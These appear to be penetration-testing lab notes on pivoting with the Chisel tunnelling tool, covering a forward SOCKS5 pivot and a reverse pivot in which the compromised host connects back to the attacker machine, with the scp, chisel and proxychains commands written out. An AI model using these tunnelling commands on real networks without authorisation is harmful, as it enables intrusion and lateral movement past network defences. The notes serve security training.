- https://github.com/jpillora/chisel
- written in GO. uses HTTP to transport data, secured with SSH

**Scenario**
- access internal host from attackbox by running Chisel on pivot

### Workflow
- download chisel from github
- `go build`

**Copy chisel binary to the pivot**
- `scp chisel ubuntu@10.129.202.64:~/`

**Run chisel on pivot host**
- `./chisel server -v -p 1234 --socks5`
	- Listen on port `1234` 
	- Forward every request to all networks accessible from the pivot host

**Connect to the Chisel server (pivot) from Pwnbox**
- `./chisel client -v 10.129.202.64:1234 socks`
	- Returns the Listener port for the pwnbox 
	- If issues, use this chisel version - https://github.com/jpillora/chisel/releases/tag/v1.7.4

**Modify proxychains**
- Add the above listener port to `/etc/proxychains.conf` 

**Execute commands**
- `proxychains xfreerdp /u /v /p`

<hr>

# Chisel Reverse Pivot
- The server has to specify `--reverse`
- The client has to specify `R:socks` - for reversed
- The server will listen and accept connections, and they will be proxied through the client

### Workflow:
**Chisel server on PWNBox**
- `sudo ./chisel server --reverse -v -p 1234 --socks5`

**Connecting the Chisel Client (pivot) to PWNbox**
- `./chisel client -v 10.10.14.17:1234 R:socks`

- Confirm `proxychains` has port number specified in `client` response
- Execute commands on the PWNBox with proxychains
